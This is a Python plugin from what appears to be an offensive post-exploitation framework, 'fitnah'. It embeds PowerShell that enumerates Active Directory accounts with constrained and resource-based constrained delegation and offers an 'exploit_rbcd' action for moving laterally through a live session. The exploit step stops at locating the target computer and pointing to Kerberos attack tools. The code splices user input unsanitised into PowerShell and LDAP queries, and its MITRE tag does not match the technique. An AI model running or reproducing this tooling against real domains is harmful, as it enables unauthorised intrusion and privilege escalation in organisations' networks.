"""lateral_movement/constrained_delegation — Exploit constrained delegation and RBCD. MITRE T1187"""
from fitnah.sdk import BasePlugin, ModuleResult
from fitnah.sdk.schema import Param, ParamSchema
import logging

log = logging.getLogger(__name__)


class ConstrainedDelegation(BasePlugin):
    NAME = "constrained_delegation"
    DESCRIPTION = "Find and exploit constrained delegation and Resource-Based Constrained Delegation (RBCD)"
    AUTHOR = "fitnah-team"
    MITRE = "T1187"
    CATEGORY = "lateral_movement"
    VERSION = "1.0.0"

    schema = ParamSchema().add(
        Param("action", str, required=False, default="detect",
              help="detect | enumerate | exploit_rbcd"),
        Param("target_user", str, required=False, default="",
              help="Target user account for RBCD exploitation"),
        Param("target_computer", str, required=False, default="",
              help="Target computer to modify (RBCD)"),
        Param("allowed_service", str, required=False, default="",
              help="Service to request TGS for"),
    )

    def run(self, session, params, ctx=None) -> ModuleResult:
        """Execute constrained delegation attack"""
        if ctx is None:
            return ModuleResult.err("Requires live session")

        action = params.get("action", "detect").lower()
        target_user = params.get("target_user", "")
        target_computer = params.get("target_computer", "")
        allowed_service = params.get("allowed_service", "")

        if action == "detect":
            return self._detect_constrained(ctx)
        elif action == "enumerate":
            return self._enumerate_delegation(ctx, target_user)
        elif action == "exploit_rbcd":
            return self._exploit_rbcd(ctx, target_user, target_computer)
        else:
            return ModuleResult.err(f"Unknown action: {action}")

    @staticmethod
    def _detect_constrained(ctx) -> ModuleResult:
        """Detect machines with constrained delegation"""
        ps_code = """
$results = @()
$results += '[*] Detecting constrained delegation...'

try {
    $domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name
    $dc = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().FindDomainController().Name

    $results += "[*] Domain: $domain"

    # LDAP search for accounts with msDS-AllowedToDelegateTo
    $de = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$dc")
    $ds = New-Object System.DirectoryServices.DirectorySearcher($de)
    $ds.Filter = "(msDS-AllowedToDelegateTo=*)"
    $ds.PageSize = 1000

    $delegatedAccounts = $ds.FindAll()
    $results += "[+] Found $($delegatedAccounts.Count) accounts with constrained delegation"

    foreach ($account in $delegatedAccounts) {
        $name = $account.Properties['sAMAccountName'][0]
        $allowedTo = $account.Properties['msDS-AllowedToDelegateTo']

        $results += "  [*] $name can delegate to:"
        foreach ($service in $allowedTo) {
            $results += "      → $service"
        }
    }

    # Also check for RBCD (msDS-AllowedToActOnBehalfOfOtherIdentity)
    $ds.Filter = "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)"
    $rbcdAccounts = $ds.FindAll()
    $results += "[+] Found $($rbcdAccounts.Count) accounts with RBCD configured"

    foreach ($account in $rbcdAccounts) {
        $name = $account.Properties['name'][0]
        $results += "  [*] $name has RBCD configured"
    }

} catch {
    $results += "[!] Detection error: $_"
}

$results -join "`n"
"""
        r = ctx.ps(ps_code)
        if r["status"] != "ok":
            return ModuleResult.err(f"Detection failed: {r['output']}")

        return ModuleResult.ok(data=r["output"], loot_kind="constrained_delegation_detect")

    @staticmethod
    def _enumerate_delegation(ctx, target_user: str) -> ModuleResult:
        """Enumerate delegation targets for a specific user"""
        ps_code = f"""
$results = @()
$results += '[*] Enumerating delegation targets...'

try {{
    $domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name
    $dc = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().FindDomainController().Name

    $targetUser = '{target_user}'
    if (-not $targetUser) {{
        $results += '[-] Specify target user'
        $results -join "`n"
        exit
    }}

    $results += "[*] Looking up: $targetUser"

    # Query LDAP for user
    $de = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$dc")
    $ds = New-Object System.DirectoryServices.DirectorySearcher($de)
    $ds.Filter = "(&(objectClass=user)(sAMAccountName=$targetUser))"

    $user = $ds.FindOne()
    if (-not $user) {{
        $results += "[-] User not found"
        $results -join "`n"
        exit
    }}

    $results += "[+] User found: $($user.Path)"

    # Check msDS-AllowedToDelegateTo
    $allowedTo = $user.Properties['msDS-AllowedToDelegateTo']
    if ($allowedTo.Count -gt 0) {{
        $results += "[+] Can delegate to:"
        foreach ($service in $allowedTo) {{
            $results += "    → $service"
        }}
    }} else {{
        $results += "[*] No constrained delegation configured"
    }}

}} catch {{
    $results += "[!] Enumeration error: $_"
}}

$results -join "`n"
"""
        r = ctx.ps(ps_code)
        if r["status"] != "ok":
            return ModuleResult.err(f"Enumeration failed: {r['output']}")

        return ModuleResult.ok(data=r["output"])

    @staticmethod
    def _exploit_rbcd(ctx, target_user: str, target_computer: str) -> ModuleResult:
        """Exploit Resource-Based Constrained Delegation"""
        ps_code = f"""
$results = @()
$results += '[*] Exploiting RBCD (Resource-Based Constrained Delegation)...'

try {{
    $targetUser = '{target_user}'
    $targetComputer = '{target_computer}'

    if (-not $targetUser -or -not $targetComputer) {{
        $results += '[-] Specify both target user and target computer'
        $results -join "`n"
        exit
    }}

    $domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name
    $dc = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().FindDomainController().Name

    $results += "[*] Target user: $targetUser"
    $results += "[*] Target computer: $targetComputer"
    $results += "[*] Domain: $domain"

    # RBCD exploitation steps:
    # 1. Find target computer object in AD
    # 2. Modify msDS-AllowedToActOnBehalfOfOtherIdentity to include our account
    # 3. Request S4U2Self for our account
    # 4. Request S4U2Proxy to target service
    # 5. Impersonate target user

    $results += '[*] Step 1: Locating target computer in AD...'
    $de = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$dc")
    $ds = New-Object System.DirectoryServices.DirectorySearcher($de)
    $ds.Filter = "(&(objectClass=computer)(sAMAccountName=$targetComputer$))"

    $computer = $ds.FindOne()
    if (-not $computer) {{
        $results += "[-] Computer not found"
        $results -join "`n"
        exit
    }}

    $results += "[+] Computer found: $($computer.Path)"

    # Check current RBCD settings
    $rbcdProp = $computer.Properties['msDS-AllowedToActOnBehalfOfOtherIdentity']
    if ($rbcdProp.Count -eq 0) {{
        $results += '[*] No RBCD configured yet'
    }} else {{
        $results += '[*] RBCD already configured'
    }}

    $results += '[*] RBCD exploitation requires:'
    $results += '    1. Write permissions to target computer'
    $results += '    2. Service account credentials for S4U requests'
    $results += '    3. Kerberos ticket handling capability'

    $results += '[!] Full RBCD requires advanced Kerberos tools'
    $results += '[!] See: Rubeus.exe / PyKEK for exploitation'

}} catch {{
    $results += "[!] RBCD error: $_"
}}

$results -join "`n"
"""
        r = ctx.ps(ps_code)
        if r["status"] != "ok":
            return ModuleResult.err(f"RBCD exploitation failed: {r['output']}")

        return ModuleResult.ok(data=r["output"], loot_kind="rbcd_exploit")
